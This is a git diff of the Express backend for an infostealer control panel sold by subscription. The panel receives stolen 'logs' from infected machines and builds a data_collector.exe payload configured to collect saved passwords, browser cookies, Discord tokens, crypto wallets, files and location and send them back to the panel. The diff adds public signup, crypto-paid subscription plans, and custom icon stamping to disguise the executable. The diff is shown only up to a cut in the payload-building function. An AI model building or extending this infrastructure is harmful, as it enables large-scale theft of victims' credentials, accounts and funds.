@@ -5,10 +5,51 @@ const path = require('path');
 const fs = require('fs');
 const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
-const { userDb, loginAttemptsDb, logsDb } = require('./database');
+const os = require('os');
+const { db, userDb, loginAttemptsDb, logsDb, pendingPaymentsDb } = require('./database');
+
+// Multer for file uploads
+const multer = require('multer');
+const uploadStorage = multer.diskStorage({
+    destination: (req, file, cb) => {
+        const tempDir = path.join(os.tmpdir(), 'payload-icons');
+        if (!fs.existsSync(tempDir)) {
+            fs.mkdirSync(tempDir, { recursive: true });
+        }
+        cb(null, tempDir);
+    },
+    filename: (req, file, cb) => {
+        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
+        cb(null, 'icon-' + uniqueSuffix + '.ico');
+    }
+});
+const uploadIcon = multer({ 
+    storage: uploadStorage,
+    limits: { fileSize: 1024 * 1024 }, // 1MB max
+    fileFilter: (req, file, cb) => {
+        if (file.originalname.toLowerCase().endsWith('.ico')) {
+            cb(null, true);
+        } else {
+            cb(new Error('Only .ico files are allowed'));
+        }
+    }
+}).single('icon');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
+
+// NOWPayments API configuration (https://nowpayments.io)
+const NOWPAYMENTS_API_KEY = process.env.NOWPAYMENTS_API_KEY || '';
+const NOWPAYMENTS_API_URL = 'https://api.nowpayments.io/v1';
+const NOWPAYMENTS_IPN_SECRET = process.env.NOWPAYMENTS_IPN_SECRET || '';
+
+
+// Manual payment wallet addresses (for direct crypto payment)
+const WALLET_ADDRESSES = {
+    BTC: process.env.WALLET_BTC || '',
+    ETH: process.env.WALLET_ETH || '',
+    USDT: process.env.WALLET_USDT || '' // USDT on Ethereum/ERC20
+};
 
 // Helper function to check if a cookie is non-expired
 const isCookieNonExpired = (cookie) => {
@@ -212,7 +253,7 @@ const authenticateToken = (req, res, next) => {
 
 // API Endpoints
 
-// Authentication endpoint
+// Authentication endpoint - Username/Password login
 app.post('/api/auth/login', (req, res) => {
     try {
         const { username, password } = req.body;
@@ -220,11 +261,11 @@ app.post('/api/auth/login', (req, res) => {
         const userAgent = req.headers['user-agent'] || 'Unknown';
 
         if (!username || !password) {
-            loginAttemptsDb.create(username || 'unknown', ipAddress, false, userAgent);
+            loginAttemptsDb.create('unknown', ipAddress, false, userAgent);
             return res.status(400).json({ message: 'Username and password are required' });
         }
 
-        // Find user in database
+        // Find user by username
         const user = userDb.findByUsername(username);
 
         if (!user) {
@@ -232,7 +273,7 @@ app.post('/api/auth/login', (req, res) => {
             return res.status(401).json({ message: 'Invalid username or password' });
         }
 
-        // Verify password
+        // Verify the password against the password hash
         const passwordValid = bcrypt.compareSync(password, user.password_hash);
         
         if (!passwordValid) {
@@ -256,7 +297,7 @@ app.post('/api/auth/login', (req, res) => {
         res.json({
             success: true,
             token: token,
-            username: username,
+            username: user.username,
             message: 'Login successful'
         });
     } catch (error) {
@@ -282,70 +323,50 @@ app.get('/api/auth/login-history', authenticateToken, (req, res) => {
     }
 });
 
-// User management endpoints (protected)
-app.post('/api/auth/register', authenticateToken, (req, res) => {
+// Public registration endpoint - creates account with username and password
+app.post('/api/auth/register', (req, res) => {
     try {
         const { username, password } = req.body;
+        const ipAddress = getClientIp(req);
 
         if (!username || !password) {
             return res.status(400).json({ message: 'Username and password are required' });
         }
 
-        if (password.length < 6) {
-            return res.status(400).json({ message: 'Password must be at least 6 characters' });
+        // Validate username
+        if (username.length < 3) {
+            return res.status(400).json({ message: 'Username must be at least 3 characters long' });
         }
 
-        // Hash password and create user
+        if (username.length > 50) {
+            return res.status(400).json({ message: 'Username must be less than 50 characters' });
+        }
+
+        // Validate username contains only alphanumeric and underscore
+        if (!/^[a-zA-Z0-9_]+$/.test(username)) {
+            return res.status(400).json({ message: 'Username can only contain letters, numbers, and underscores' });
+        }
+
+        // Validate password
+        if (password.length < 6) {
+            return res.status(400).json({ message: 'Password must be at least 6 characters long' });
+        }
+
+        // Hash the password
         const passwordHash = bcrypt.hashSync(password, 10);
         
         try {
             const newUser = userDb.create(username, passwordHash);
-            console.log(`New user created: ${username}`);
-            res.json({ success: true, message: 'User created successfully', user: newUser });
+            console.log(`New user ${username} registered from ${ipAddress} at ${new Date().toISOString()}`);
+            res.json({ success: true, message: 'Account created successfully' });
         } catch (error) {
             if (error.message === 'Username already exists') {
-                return res.status(400).json({ message: 'Username already exists' });
+                return res.status(400).json({ message: 'This username is already taken. Please choose a different one.' });
             }
             throw error;
         }
     } catch (error) {
         console.error('Registration error:', error);
-        res.status(500).json({ message: 'Internal server error' });
-    }
-});
-
-app.post('/api/auth/change-password', authenticateToken, (req, res) => {
-    try {
-        const { oldPassword, newPassword } = req.body;
-        const username = req.user.username;
-
-        if (!oldPassword || !newPassword) {
-            return res.status(400).json({ message: 'Old password and new password are required' });
-        }
-
-        if (newPassword.length < 6) {
-            return res.status(400).json({ message: 'New password must be at least 6 characters' });
-        }
-
-        const user = userDb.findByUsername(username);
-
-        if (!user) {
-            return res.status(404).json({ message: 'User not found' });
-        }
-
-        // Verify old password
-        if (!bcrypt.compareSync(oldPassword, user.password_hash)) {
-            return res.status(401).json({ message: 'Incorrect old password' });
-        }
-
-        // Update password
-        const passwordHash = bcrypt.hashSync(newPassword, 10);
-        userDb.updatePassword(username, passwordHash);
-
-        console.log(`Password changed for user: ${username}`);
-        res.json({ success: true, message: 'Password changed successfully' });
-    } catch (error) {
-        console.error('Change password error:', error);
         res.status(500).json({ message: 'Internal server error' });
     }
 });
@@ -422,35 +443,8 @@ app.patch('/api/auth/users/:username', authenticateToken, (req, res) => {
     }
 });
 
-// Reset password (admin only - no old password required)
-app.post('/api/auth/reset-password', authenticateToken, (req, res) => {
-    try {
-        const { username, newPassword } = req.body;
-        
-        if (!username || !newPassword) {
-            return res.status(400).json({ message: 'Username and new password are required' });
-        }
-        
-        if (newPassword.length < 6) {
-            return res.status(400).json({ message: 'New password must be at least 6 characters' });
-        }
-        
-        const user = userDb.findByUsername(username);
-        if (!user) {
-            return res.status(404).json({ message: 'User not found' });
-        }
-        
-        // Hash new password with bcrypt (includes automatic salting)
-        const passwordHash = bcrypt.hashSync(newPassword, 10);
-        userDb.updatePassword(username, passwordHash);
-        
-        console.log(`Password reset for user ${username} by ${req.user.username}`);
-        res.json({ success: true, message: 'Password reset successfully' });
-    } catch (error) {
-        console.error('Error resetting password:', error);
-        res.status(500).json({ message: 'Internal server error' });
-    }
-});
+// Note: Reset password removed - key-based auth doesn't support key changes
+// If a user loses their key, they need to register a new one
 
 // Logs endpoints
 app.get('/api/logs', authenticateToken, (req, res) => {
@@ -476,13 +470,28 @@ app.get('/api/logs', authenticateToken, (req, res) => {
             // If log has no user field or user is null/empty, show it only to "account" user (for backward compatibility)
             const logUser = log.user;
             if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
-                return username === 'account';
+                const matches = username === 'account';
+                if (!matches && allLogs.length <= 10) {
+                    console.log(`  Log ${log.id}: no user field, showing only to 'account' user (logged in as: ${username})`);
+                }
+                return matches;
             }
-            // Show log if user matches
-            return logUser === username;
+            // Show log if user matches (case-sensitive exact match)
+            const matches = logUser === username;
+            if (!matches && allLogs.length <= 10) {
+                console.log(`  Log ${log.id}: user="${logUser}" !== username="${username}" (no match)`);
+            } else if (matches && allLogs.length <= 10) {
+                console.log(`  Log ${log.id}: user="${logUser}" === username="${username}" (MATCH)`);
+            }
+            return matches;
         });
         
-        console.log(`Filtered logs for user ${username}: ${logs.length} logs found (from ${allLogs.length} total)`);
+        console.log(`Filtered logs for user "${username}": ${logs.length} logs found (from ${allLogs.length} total)`);
+        if (logs.length === 0 && allLogs.length > 0) {
+            console.log(`⚠️  WARNING: No logs matched username "${username}". Check if payload was generated with this exact username.`);
+            console.log(`   Available users in database: ${Object.keys(userCounts).join(', ')}`);
+            console.log(`   To see these logs, you need to log in with one of these usernames: ${Object.keys(userCounts).filter(u => u !== 'null').join(', ')}`);
+        }
         
         res.json(logs);
     } catch (error) {
@@ -579,10 +588,20 @@ app.post('/api/upload', (req, res) => {
             delete pcDataToStore.browserCookies;
         }
         
-        // Extract user from pcData
-        const user = pcData?.user || null;
+        // Extract user from pcData - check multiple possible locations
+        let user = pcData?.user || null;
         
-        console.log(`Received log chunk - user: ${user || 'null'}, session: ${sessionId || 'none'}, IP: ${ip}`);
+        // Debug: log the entire pcData structure to see what we're receiving
+        if (!user || user === null || user === '') {
+            console.log(`⚠️  WARNING: Received log chunk with no user field - session: ${sessionId || 'none'}, IP: ${ip}`);
+            console.log(`   This log will only be visible to 'account' user. Make sure payload was generated with correct username.`);
+            console.log(`   Full pcData keys: ${Object.keys(pcData || {}).join(', ')}`);
+            console.log(`   pcData.user value: ${JSON.stringify(pcData?.user)}`);
+            console.log(`   pcData type: ${typeof pcData}, is null: ${pcData === null}, is undefined: ${pcData === undefined}`);
+        } else {
+            console.log(`✓ Received log chunk - user: "${user}" (type: ${typeof user}), session: ${sessionId || 'none'}, IP: ${ip}`);
+            console.log(`  This log will be visible to user "${user}" when they log in`);
+        }
         
         const logData = {
             id: logId,
@@ -612,6 +631,44 @@ app.post('/api/upload', (req, res) => {
             message: 'Error processing log',
             error: error.message 
         });
+    }
+});
+
+// Debug endpoint to check what's in the database
+app.get('/api/logs/debug', authenticateToken, (req, res) => {
+    try {
+        const username = req.user.username;
+        const allLogs = logsDb.getAll();
+        
+        const userCounts = {};
+        allLogs.forEach(log => {
+            const u = log.user || 'null';
+            userCounts[u] = (userCounts[u] || 0) + 1;
+        });
+        
+        const yourLogs = allLogs.filter(log => {
+            const logUser = log.user;
+            if (!logUser || logUser === null || logUser === '' || logUser === undefined) {
+                return username === 'account';
+            }
+            return logUser === username;
+        });
+        
+        res.json({
+            loggedInAs: username,
+            totalLogsInDatabase: allLogs.length,
+            yourLogsCount: yourLogs.length,
+            userDistribution: userCounts,
+            sampleLogs: allLogs.slice(0, 5).map(log => ({
+                id: log.id,
+                user: log.user || 'null',
+                ip: log.ip,
+                date: log.date
+            }))
+        });
+    } catch (error) {
+        console.error('Debug endpoint error:', error);
+        res.status(500).json({ message: 'Internal server error' });
     }
 });
 
@@ -685,98 +742,774 @@ app.post('/api/logs/delete', authenticateToken, (req, res) => {
 // Magic marker that the exe looks for to find embedded config
 const CONFIG_MARKER = '<<<PAYLOAD_CONFIG_START>>>';
 
-// Payload generation endpoint - creates a standalone exe with embedded config
-app.post('/api/payloads/generate', authenticateToken, (req, res) => {
+// Get subscription status endpoint
+app.get('/api/subscription', authenticateToken, (req, res) => {
     try {
         const username = req.user.username;
-        const { features, user, outputName } = req.body;
-
-        if (!features || typeof features !== 'object') {
-            return res.status(400).json({ message: 'features object is required' });
+        const subscription = userDb.getSubscription(username);
+        
+        if (!subscription) {
+            return res.status(404).json({ message: 'User not found' });
         }
-
-        // Verify that the user matches the authenticated user
-        if (user && user !== username) {
-            return res.status(403).json({ message: 'Cannot generate payloads for other users' });
-        }
-
-        // Path to the payload executable
-        const payloadPath = path.join(__dirname, '..', 'data_collector.exe');
-
-        // Check if payload exists
-        if (!fs.existsSync(payloadPath)) {
-            return res.status(500).json({ message: 'Payload executable not found. Please build the payload first.' });
-        }
-
-        // Get server URL from environment or construct from request
-        const serverUrl = process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}/api/upload`;
-
-        console.log(`Generating payload for user ${username} with server URL: ${serverUrl}`);
-        console.log(`Selected features:`, features);
-
-        // Read the original exe file
-        const exeBuffer = fs.readFileSync(payloadPath);
-
-        // Create the configuration JSON that will be appended
-        const configJson = JSON.stringify({
-            user: username,
-            serverUrl: serverUrl,
-            collectLocation: features.location || false,
-            collectSystemInfo: features.systemInfo || false,
-            collectRunningProcesses: features.runningProcesses || false,
-            collectInstalledApps: features.installedApps || false,
-            collectBrowserCookies: features.browserCookies || false,
-            collectSavedPasswords: features.savedPasswords || false,
-            collectBrowserHistory: features.browserHistory || false,
-            collectDiscordTokens: features.discordTokens || false,
-            collectCryptoWallets: features.cryptoWallets || false,
-            collectImportantFiles: features.importantFiles || false
-        });
-
-        // Create buffer with marker + config
-        const markerBuffer = Buffer.from(CONFIG_MARKER, 'utf-8');
-        const configBuffer = Buffer.from(configJson, 'utf-8');
-
-        // Combine exe + marker + config
-        const finalBuffer = Buffer.concat([exeBuffer, markerBuffer, configBuffer]);
-
-        // Sanitize output filename (remove invalid chars, ensure .exe extension)
-        let filename = outputName || `payload_${username}_${Date.now()}`;
-        filename = filename.replace(/[<>:"/\\|?*]/g, '_'); // Remove invalid Windows filename chars
-        if (!filename.toLowerCase().endsWith('.exe')) {
-            filename += '.exe';
-        }
-
-        // Set response headers for exe download
-        res.setHeader('Content-Type', 'application/octet-stream');
-        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
-        res.setHeader('Content-Length', finalBuffer.length);
-
-        console.log(`Sending patched payload: ${filename} (${finalBuffer.length} bytes)`);
-
-        // Send the patched exe
-        res.send(finalBuffer);
-
+        
+        res.json(subscription);
     } catch (error) {
-        console.error('Error generating payload:', error);
-        res.status(500).json({ message: 'Internal server error', error: error.message });
+        console.error('Error getting subscription:', error);
+        res.status(500).json({ message: 'Internal server error' });
     }
 });
 
-app.get('/api/stats', (req, res) => {
+// Admin: Set subscription for a user
+app.post('/api/subscription/set', authenticateToken, (req, res) => {
     try {
-        const stats = logsDb.getStats();
-        res.json(stats);
+        const { targetUser, days, type } = req.body;
+        
+        if (!targetUser || !days) {
+            return res.status(400).json({ message: 'targetUser and days are required' });
+        }
+        
+        const daysNum = parseInt(days);
+        if (isNaN(daysNum) || daysNum < 0) {
+            return res.status(400).json({ message: 'days must be a positive number' });
+        }
+        
+        // Find the target user
+        const user = userDb.findByUsername(targetUser);
+        if (!user) {
+            return res.status(404).json({ message: 'Target user not found' });
+        }
+        
+        const success = userDb.setSubscription(targetUser, daysNum, type || 'standard');
+        
+        if (success) {
+            const newSub = userDb.getSubscription(targetUser);
+            console.log(`Subscription set for user ${targetUser.substring(0, 8)}...: ${daysNum} days`);
+            res.json({ success: true, message: 'Subscription set successfully', subscription: newSub });
+        } else {
+            res.status(500).json({ message: 'Failed to set subscription' });
+        }
+    } catch (error) {
+        console.error('Error setting subscription:', error);
+        res.status(500).json({ message: 'Internal server error' });
+    }
+});
+
+// Admin: Add days to subscription
+app.post('/api/subscription/add', authenticateToken, (req, res) => {
+    try {
+        const { targetUser, days } = req.body;
+        
+        if (!targetUser || !days) {
+            return res.status(400).json({ message: 'targetUser and days are required' });
+        }
+        
+        const daysNum = parseInt(days);
+        if (isNaN(daysNum) || daysNum <= 0) {
+            return res.status(400).json({ message: 'days must be a positive number' });
+        }
+        
+        const user = userDb.findByUsername(targetUser);
+        if (!user) {
+            return res.status(404).json({ message: 'Target user not found' });
+        }
+        
+        const success = userDb.addSubscriptionDays(targetUser, daysNum);
+        
+        if (success) {
+            const newSub = userDb.getSubscription(targetUser);
+            console.log(`Added ${daysNum} days to subscription for user ${targetUser.substring(0, 8)}...`);
+            res.json({ success: true, message: `Added ${daysNum} days to subscription`, subscription: newSub });
+        } else {
+            res.status(500).json({ message: 'Failed to add subscription days' });
+        }
+    } catch (error) {
+        console.error('Error adding subscription days:', error);
+        res.status(500).json({ message: 'Internal server error' });
+    }
+});
+
+// Admin: Remove subscription
+app.post('/api/subscription/remove', authenticateToken, (req, res) => {
+    try {
+        const { targetUser } = req.body;
+        
+        if (!targetUser) {
+            return res.status(400).json({ message: 'targetUser is required' });
+        }
+        
+        const user = userDb.findByUsername(targetUser);
+        if (!user) {
+            return res.status(404).json({ message: 'Target user not found' });
+        }
+        
+        const success = userDb.removeSubscription(targetUser);
+        
+        if (success) {
+            console.log(`Subscription removed for user ${targetUser.substring(0, 8)}...`);
+            res.json({ success: true, message: 'Subscription removed successfully' });
+        } else {
+            res.status(500).json({ message: 'Failed to remove subscription' });
+        }
+    } catch (error) {
+        console.error('Error removing subscription:', error);
+        res.status(500).json({ message: 'Internal server error' });
+    }
+});
+
+// ==================== NOWPayments Payment Integration ====================
+
+// Subscription plans configuration
+const SUBSCRIPTION_PLANS = {
+    week: { days: 7, price: 20, name: 'Week', currency: 'EUR' },
+    month: { days: 30, price: 55, name: 'Month', currency: 'EUR' },
+    '6month': { days: 180, price: 220, name: '6 Month', currency: 'EUR' }
+};
+
+// Helper function to call NOWPayments API
+async function nowPaymentsRequest(endpoint, method = 'GET', body = null) {
+    if (!NOWPAYMENTS_API_KEY) {
+        throw new Error('NOWPayments API key not configured');
+    }
+
+    const url = `${NOWPAYMENTS_API_URL}${endpoint}`;
+    const options = {
+        method,
+        headers: {
+            'x-api-key': NOWPAYMENTS_API_KEY,
+            'Content-Type': 'application/json'
+        }
+    };
+
+    if (body) {
+        options.body = JSON.stringify(body);
+    }
+
+    const response = await fetch(url, options);
+    const data = await response.json();
+
+    if (!response.ok) {
+        throw new Error(data.message || data.err || 'NOWPayments API error');
+    }
+
+    return data;
+}
+
+
+// Create payment invoice for a subscription plan
+app.post('/api/payment/create-invoice', authenticateToken, async (req, res) => {
+    try {
+        const username = req.user.username;
+        const { planId, provider } = req.body; // provider: 'nowpayments' or undefined for auto
+        
+        if (!planId || !SUBSCRIPTION_PLANS[planId]) {
+            return res.status(400).json({ message: 'Invalid plan selected' });
+        }
+        
+        const plan = SUBSCRIPTION_PLANS[planId];
+        const webhookUrl = `${process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}`}/api/payment/webhook`;
+        const returnUrl = `${process.env.WEBPANEL_URL || `${req.protocol}://${req.get('host')}`}/purchase`;
+        
+        // If provider is specified, use it; otherwise use priority: NOWPayments > Manual
+        // Try NOWPayments if provider is 'nowpayments' or not specified (and NOWPayments is configured)
+        if ((provider === 'nowpayments' || (!provider && NOWPAYMENTS_API_KEY)) && NOWPAYMENTS_API_KEY) {
+            try {
+                // Create invoice via NOWPayments API
+                // Encode subscription info in order_id: sub_username_planId_days_timestamp
+                // NOWPayments doesn't support metadata field, so we encode it in order_id
+                const orderId = `sub_${username}_${planId}_${plan.days}_${Date.now()}`;
+
+                const invoice = await nowPaymentsRequest('/invoice', 'POST', {
+                    price_amount: plan.price,
+                    price_currency: plan.currency.toLowerCase(),
+                    pay_currency: 'ltc', // Default currency, user can change on payment page
+                    order_id: orderId,
+                    order_description: `${plan.name} Subscription`,
+                    ipn_callback_url: webhookUrl,
+                    success_url: returnUrl,
+                    cancel_url: returnUrl
+                });
+
+                console.log(`[NOWPayments] Invoice created for user ${username.substring(0, 8)}...: ${plan.name} plan, Payment ID: ${invoice.payment_id}`);
+                console.log(`[NOWPayments] Full invoice response:`, JSON.stringify(invoice, null, 2));
+                
+                // Check for the correct URL field in NOWPayments response
+                const payUrl = invoice.invoice_url || invoice.pay_url || invoice.payment_url;
+                if (!payUrl) {
+                    console.error('[NOWPayments] No payment URL found in response:', invoice);
+                    throw new Error('No payment URL received from NOWPayments');
+                }
+
+                return res.json({
+                    success: true,
+                    invoiceId: invoice.payment_id,
+                    payUrl: payUrl,
+                    amount: plan.price,
+                    currency: plan.currency,
+                    plan: plan.name,
+                    expiresAt: new Date(Date.now() + 3600000).toISOString(),
+                    paymentMethod: 'nowpayments'
+                });
+            } catch (nowPaymentsError) {
+                console.error('[NOWPayments] Error creating invoice:', nowPaymentsError);
+                // If NOWPayments fails and provider was explicitly 'nowpayments', throw error
+                if (provider === 'nowpayments') {
+                    throw nowPaymentsError;
+                }
+                // Otherwise, fall through to manual payment
+            }
+        }
+        
+        // Otherwise, return wallet addresses for manual payment
+        // Only reach here if NOWPayments is not configured or failed (and provider wasn't explicitly set)
+        if (NOWPAYMENTS_API_KEY && !provider) {
+            console.warn(`Payment provider configured but invoice creation failed. Falling back to manual payment for user ${username.substring(0, 8)}...`);
+        }
+        
+        res.json({
+            success: true,
+            paymentMethod: 'manual',
+            amount: plan.price,
+            currency: plan.currency,
+            plan: plan.name,
+            planId: planId,
+            days: plan.days,
+            wallets: WALLET_ADDRESSES
+        });
+        
+    } catch (error) {
+        console.error('Error creating invoice:', error);
+        res.status(500).json({ message: error.message || 'Failed to create payment invoice' });
+    }
+});
+
+// Check invoice status
+app.get('/api/payment/check/:invoiceId', authenticateToken, async (req, res) => {
+    try {
+        const { invoiceId } = req.params;
+        const { provider } = req.query; // Optional: 'nowpayments'
+        
+        // Try NOWPayments
+        if ((!provider || provider === 'nowpayments') && NOWPAYMENTS_API_KEY) {
+            try {
+                const payment = await nowPaymentsRequest(`/payment/${invoiceId}`, 'GET');
+                return res.json({
+                    status: payment.payment_status,
+                    paid: payment.payment_status === 'finished' || payment.payment_status === 'confirmed',
+                    amount: payment.price_amount,
+                    currency: payment.price_currency
+                });
+            } catch (err) {
+                throw err;
+            }
+        }
+        
+        return res.status(500).json({ message: 'Payment system not configured' });
+        
+    } catch (error) {
+        console.error('Error checking invoice:', error);
+        if (error.message && error.message.includes('not found')) {
+            return res.status(404).json({ message: 'Invoice not found' });
+        }
+        res.status(500).json({ message: 'Failed to check invoice status' });
+    }
+});
+
+// Payment webhook handler - receives payment confirmations from NOWPayments
+app.post('/api/payment/webhook', express.raw({ type: 'application/json' }), (req, res) => {
+    try {
+        // Parse the webhook body
+        let body;
+        if (Buffer.isBuffer(req.body)) {
+            body = JSON.parse(req.body.toString());
+        } else {
+            body = req.body;
+        }
+        
+        console.log('Payment webhook received:', JSON.stringify(body, null, 2));
+        
+        let username, planId, days, orderId, provider;
+        
+        // Detect provider and parse webhook
+        if (body.payment_status || body.payment_id) {
+            // NOWPayments webhook
+            provider = 'NOWPayments';
+            
+            // Verify IPN signature if configured
+            if (NOWPAYMENTS_IPN_SECRET) {
+                const crypto = require('crypto');
+                const signature = req.headers['x-nowpayments-sig'];
+                const payload = JSON.stringify(body);
+                const expectedSig = crypto
+                    .createHmac('sha512', NOWPAYMENTS_IPN_SECRET)
+                    .update(payload)
+                    .digest('hex');
+                
+                if (signature !== expectedSig) {
+                    console.error('Invalid NOWPayments webhook signature');
+                    return res.status(401).send('Invalid signature');
+                }
+            }
+            
+            // Check if payment is confirmed
+            if (body.payment_status !== 'finished' && body.payment_status !== 'confirmed') {
+                return res.status(200).send('OK');
+            }
+            
+            orderId = body.order_id || '';
+        } else {
+            // Unknown webhook format
+            console.log('Unknown webhook format, ignoring');
+            return res.status(200).send('OK');
+        }
+        
+        // Parse subscription info from order_id: sub_username_planId_days_timestamp
+        const orderIdParts = orderId.split('_');
+        
+        if (orderIdParts.length < 4 || orderIdParts[0] !== 'sub') {
+            console.error(`Invalid order_id format from ${provider}:`, orderId);
+            return res.status(200).send('OK');
+        }
+        
+        username = orderIdParts[1];
+        planId = orderIdParts[2];
+        days = parseInt(orderIdParts[3], 10);
+        
+        if (!username || !days || isNaN(days)) {
+            console.error(`Invalid order_id data from ${provider}:`, { username, planId, days });
+            return res.status(200).send('OK');
+        }
+        
+        // Activate subscription
+        const success = userDb.addSubscriptionDays(username, days);
+        
+        if (success) {
+            const paymentId = body.payment_id || body.invoice_id || body.id || 'unknown';
+            console.log(`✓ [${provider}] Payment confirmed! Activated ${days} days for user ${username.substring(0, 8)}... (Payment ID: ${paymentId})`);
+        } else {
+            console.error(`Failed to activate subscription for user ${username.substring(0, 8)}...`);
+        }
+        
+        res.status(200).send('OK');
+        
+    } catch (error) {
+        console.error('Webhook error:', error);
+        res.status(200).send('OK'); // Always return 200 to prevent retries
+    }
+});
+
+// Get available subscription plans
+app.get('/api/payment/plans', (req, res) => {
+    const plans = Object.entries(SUBSCRIPTION_PLANS).map(([id, plan]) => ({
+        id,
+        name: plan.name,
+        days: plan.days,
+        price: plan.price,
+        currency: plan.currency
+    }));
+
+    const hasWallets = Object.values(WALLET_ADDRESSES).some(addr => addr && addr.trim() !== '');
+
+    res.json({
+        plans,
+        cryptoBotEnabled: !!NOWPAYMENTS_API_KEY, // Keep name for frontend compatibility
+        nowPaymentsEnabled: !!NOWPAYMENTS_API_KEY,
+        bitpapaEnabled: false,
+        manualPaymentsEnabled: hasWallets,
+        wallets: WALLET_ADDRESSES
+    });
+});
+
+
+// Submit manual payment (user provides transaction hash)
+app.post('/api/payment/submit', authenticateToken, (req, res) => {
+    try {
+        const username = req.user.username;
+        const { planId, cryptoCurrency, transactionHash } = req.body;
+        
+        if (!planId || !SUBSCRIPTION_PLANS[planId]) {
+            return res.status(400).json({ message: 'Invalid plan selected' });
+        }
+        
+        if (!cryptoCurrency || !['BTC', 'ETH', 'USDT'].includes(cryptoCurrency)) {
+            return res.status(400).json({ message: 'Invalid cryptocurrency. Use BTC, ETH, or USDT' });
+        }
+        
+        if (!transactionHash || transactionHash.trim().length < 10) {
+            return res.status(400).json({ message: 'Transaction hash is required' });
+        }
+        
+        const plan = SUBSCRIPTION_PLANS[planId];
+        const walletAddress = WALLET_ADDRESSES[cryptoCurrency];
+        
+        if (!walletAddress || walletAddress.trim() === '') {
+            return res.status(400).json({ message: `Wallet address for ${cryptoCurrency} is not configured` });
+        }
+        
+        // Check if this transaction hash was already submitted
+        const existingByHash = db.prepare('SELECT * FROM pending_payments WHERE transaction_hash = ?').get(transactionHash.trim());
+        if (existingByHash) {
+            return res.status(400).json({ message: 'This transaction hash has already been submitted' });
+        }
+        
+        // Create pending payment record
+        const paymentId = pendingPaymentsDb.create({
+            username,
+            planId,
+            planName: plan.name,
+            days: plan.days,
+            amount: plan.price,
+            currency: plan.currency,
+            cryptoCurrency,
+            transactionHash: transactionHash.trim()
+        });
+        
+        console.log(`Payment submitted by ${username.substring(0, 8)}...: ${plan.name} plan, ${cryptoCurrency} tx: ${transactionHash.substring(0, 16)}...`);
+        
+        res.json({
+            success: true,
+            message: 'Payment submitted successfully. Your subscription will be activated after verification.',
+            paymentId
+        });
+        
+    } catch (error) {
+        console.error('Error submitting payment:', error);
+        res.status(500).json({ message: error.message || 'Failed to submit payment' });
+    }
+});
+
+// Get user's pending payments
+app.get('/api/payment/pending', authenticateToken, (req, res) => {
+    try {
+        const username = req.user.username;
+        const payments = pendingPaymentsDb.getByUsername(username);
+        res.json({ payments });
+    } catch (error) {
+        console.error('Error fetching pending payments:', error);
+        res.status(500).json({ message: 'Failed to fetch pending payments' });
+    }
+});
+
+// Admin: Get all pending payments
+app.get('/api/payment/admin/pending', authenticateToken, (req, res) => {
+    try {
+        // Check if user is admin (you can add admin check here)
+        const payments = pendingPaymentsDb.getAll('pending');
+        res.json({ payments });
+    } catch (error) {
+        console.error('Error fetching pending payments:', error);
+        res.status(500).json({ message: 'Failed to fetch pending payments' });
+    }
+});
+
+// Admin: Verify payment and activate subscription
+app.post('/api/payment/admin/verify/:paymentId', authenticateToken, (req, res) => {
+    try {
+        const { paymentId } = req.params;
+        const verifiedBy = req.user.username;
+        
+        const payment = pendingPaymentsDb.getById(parseInt(paymentId));
+        if (!payment) {
+            return res.status(404).json({ message: 'Payment not found' });
+        }
+        
+        if (payment.status !== 'pending') {
+            return res.status(400).json({ message: `Payment is already ${payment.status}` });
+        }
+        
+        // Verify payment
+        pendingPaymentsDb.verify(parseInt(paymentId), verifiedBy);
+        
+        // Activate subscription
+        const success = userDb.addSubscriptionDays(payment.username, payment.days);
+        
+        if (success) {
+            console.log(`✓ Payment verified by ${verifiedBy}: Activated ${payment.days} days for user ${payment.username.substring(0, 8)}...`);
+            res.json({
+                success: true,
+                message: `Subscription activated for ${payment.username}`
+            });
+        } else {
+            res.status(500).json({ message: 'Failed to activate subscription' });
+        }
+        
+    } catch (error) {
+        console.error('Error verifying payment:', error);
+        res.status(500).json({ message: error.message || 'Failed to verify payment' });
+    }
+});
+
+// Admin: Reject payment
+app.post('/api/payment/admin/reject/:paymentId', authenticateToken, (req, res) => {
+    try {
+        const { paymentId } = req.params;
+        const verifiedBy = req.user.username;
+        
+        const payment = pendingPaymentsDb.getById(parseInt(paymentId));
+        if (!payment) {
+            return res.status(404).json({ message: 'Payment not found' });
+        }
+        
+        pendingPaymentsDb.reject(parseInt(paymentId), verifiedBy);
+        
+        console.log(`✗ Payment rejected by ${verifiedBy}: Payment ID ${paymentId} for user ${payment.username.substring(0, 8)}...`);
+        
+        res.json({
+            success: true,
+            message: 'Payment rejected'
+        });
+        
+    } catch (error) {
+        console.error('Error rejecting payment:', error);
+        res.status(500).json({ message: error.message || 'Failed to reject payment' });
+    }
+});
+
+// ==================== End NOWPayments Integration ====================
+
+// Lazy-load rcedit to avoid startup errors if not installed
+let rcedit = null;
+const getRcedit = () => {
+    if (!rcedit) {
+        try {
+            rcedit = require('rcedit');
+        } catch (e) {
+            console.error('rcedit not installed. Run: npm install rcedit');
+            return null;
+        }
+    }
+    return rcedit;
+};
+
+// Helper function to apply icon using rcedit
+const applyIconToExe = async (exePath, iconPath) => {
+    const rceditModule = getRcedit();
+    if (!rceditModule) {
+        throw new Error('rcedit not installed. Run: npm install rcedit');
+    }
+    
+    await rceditModule(exePath, { icon: iconPath });
+};
+
+// Payload generation endpoint - creates a standalone exe with embedded config
+app.post('/api/payloads/generate', authenticateToken, (req, res) => {
+    // Handle multipart form data for icon upload
+    uploadIcon(req, res, async (err) => {
+        if (err) {
+            console.error('Upload error:', err);
+            return res.status(400).json({ message: err.message || 'Error uploading icon' });
+        }
+
+        let tempExePath = null;
+        let iconPath = req.file ? req.file.path : null;
+
+        try {
+            const username = req.user.username;
+            
+            // Parse features from form data (sent as JSON string)
+            let features, user, outputName;
+            try {
+                features = req.body.features ? JSON.parse(req.body.features) : null;
+                user = req.body.user;
+                outputName = req.body.outputName;
+            } catch (parseErr) {
+                // Fallback for JSON body (backwards compatibility)
+                features = req.body.features;
+                user = req.body.user;
+                outputName = req.body.outputName;
+            }
+
+            // Check subscription status
+            if (!userDb.hasActiveSubscription(username)) {
+                return res.status(403).json({ 
+                    message: 'Active subscription required to build payloads',
